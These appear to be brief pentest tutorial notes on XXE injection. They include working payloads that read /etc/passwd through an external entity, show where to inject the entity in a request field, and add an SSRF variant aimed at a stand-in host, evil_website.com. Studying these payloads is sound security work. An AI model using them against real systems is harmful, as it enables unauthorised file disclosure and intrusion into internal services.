Injecting malicious XXE Code into the request and then calling it **OR** upload it via file upload vulnerability

XML language is mostly used for storing and transferring data Ex:
```xml
<person>
    <name>John Doe</name>
    <age>30</age>
    <email>john.doe@example.com</email>
</person>
```

### Discovery :
Checking in requests and seeing a XML text storing some values

The Exploiting XML code may be like :
```xml
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> 
]>
```

**Note : here above the command is in variable xxe so if we find a another variable being called in request we can use xxe instead like :**

```xml
<stockCheck>
  <productId>&xxe;</productId>
  <storeId>3</storeId>
</stockCheck>
```

you can use several different PAYLOADS refer [cheatsheet](https://cheatsheet.haax.fr/web-pentest/files-and-files-inclusions/xxe/)

### XXE to SSRF :
An XXE request can also be made to connect to a remote server causing SSRF like :
```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "https://evil_website.com">
]>
```
